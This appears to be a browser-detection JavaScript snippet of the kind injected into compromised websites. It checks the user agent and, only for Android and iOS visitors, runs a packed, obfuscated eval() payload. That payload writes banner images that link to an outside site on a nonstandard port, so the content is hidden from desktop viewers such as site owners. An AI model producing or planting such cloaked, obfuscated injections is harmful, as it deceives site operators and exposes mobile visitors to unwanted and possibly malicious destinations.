var url = location.search;
url = url.substr(1);
var bs={
versions:function(){
var u = navigator.userAgent, app = navigator.appVersion;
return {
trident: u.indexOf('Trident') > -1, 
presto: u.indexOf('Presto') > -1,
webKit: u.indexOf('AppleWebKit') > -1, 
gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, 
mobile: !!u.match(/AppleWebKit.*Mobile.*/)||!!u.match(/AppleWebKit/), 
ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), 
android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, 
iPhone: u.indexOf('iPhone') > -1,
iPad: u.indexOf('iPad') > -1         
};
}(),
language:(navigator.browserLanguage || navigator.language).toLowerCase()
} 
var flag = true;
if(bs.versions.mobile && url!='mobile'){
if(bs.versions.android||bs.versions.iPhone||bs.versions.iPad||bs.versions.ios){
flag=false;
}
}
if(flag){


}else{
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('0.1("<4 b=\\\'9\\\'>");0.1("<a c=\\\'e://d.6.3:8/5/7.f\\\'><2 j=\\\'k://l.g.3/2/q.o\\\'i=\\\'h%\\\'></a> ");0.1("</4>");0.1("<4 b=\\\'9\\\'>");0.1("<a c=\\\'e://d.6.3:8/5/7.f\\\'><2 j=\\\'k://l.g.3/2/n.m\\\' i=\\\'h%\\\' ></a> ");0.1("</4>");0.1("<4 b=\\\'9\\\'>");0.1("<a c=\\\'e://d.6.3:8/5/7.f\\\'><2 j=\\\'k://l.g.3/2/p.m\\\'i=\\\'h%\\\'></a> ");0.1("</4>");',27,27,'document|writeln|img|com|div|50214|xiariwtb|index|890|center||align|href|m|https|html|010haier|100|width|src|http|www|jpeg|new02|gif|new07|new01'.split('|'),0,{}))
}